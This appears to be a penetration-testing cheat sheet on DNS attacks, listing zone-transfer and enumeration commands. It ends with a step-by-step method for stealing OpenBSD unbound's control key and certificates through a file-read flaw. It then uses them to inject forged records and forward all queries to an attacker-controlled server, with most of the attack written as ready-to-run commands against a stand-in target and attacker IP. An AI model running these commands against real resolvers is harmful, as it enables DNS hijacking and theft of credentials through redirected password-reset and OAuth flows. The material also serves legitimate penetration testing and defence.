# DNS Attacks

Exploiting DNS infrastructure for information gathering and manipulation.

## Techniques
- **Zone Transfers**: AXFR requests to extract DNS records
- **Cache Poisoning**: Injecting forged DNS responses
- **Subdomain Takeover**: Claiming abandoned DNS entries
- **DNS Rebinding**: Bypassing same-origin policy via DNS

## Tools
- dig, nslookup, host, dnsrecon, dnsenum, fierce

## Quick Commands
```bash
# Zone transfer
dig axfr @ns.target.com target.com

# DNS enumeration
dnsrecon -d target.com -t std
dnsenum target.com

# Subdomain brute force
fierce --domain target.com --wordlist subdomains.txt
```

## Methodology
1. Enumerate DNS records (A, AAAA, MX, NS, TXT, CNAME)
2. Attempt zone transfers on all nameservers
3. Test for DNS cache poisoning
4. Check for subdomain takeover candidates
5. Document all discovered records

## OpenBSD unbound-control TLS-cert exfil → live cache poisoning

When an arbitrary-file-read primitive is in play on an OpenBSD host running `unbound(8)`, exfiltrate the unbound-control mTLS material from `/var/unbound/etc/tls/`:

```
control.pem   # client certificate
control.key   # client private key  ← the gold ticket
server.pem    # server cert (for verification)
```

Unlike Linux bind/named's Unix socket, OpenBSD unbound exposes a TCP control socket on `localhost:8953` authenticated by mTLS. With the three files, connect from anywhere on the network the box reaches:

```bash
cat > uc.conf <<EOF
server:
remote-control:
  control-enable: yes
  server-cert-file: server.pem
  control-key-file: control.key
  control-cert-file: control.pem
EOF

unbound-control -c uc.conf -s <TARGET>:8953 status
unbound-control -c uc.conf -s <TARGET>:8953 local_data 'attacker.example. A <ATTACKER_IP>'
unbound-control -c uc.conf -s <TARGET>:8953 forward_add . <ATTACKER_IP>@53
```

`local_data` injects A/AAAA records into the cache; `forward_add` re-routes recursion through an attacker-controlled upstream. Devastating when the box runs a headless bot that dereferences DNS-resolved URLs (host-header-injection chains, password-reset bots, OAuth redirect callbacks). 8953 normally binds localhost-only but is sometimes exposed on misconfigured / lab boxes.

**MITRE**: T1071.004 | **CWE**: CWE-350 | **CAPEC**: CAPEC-142
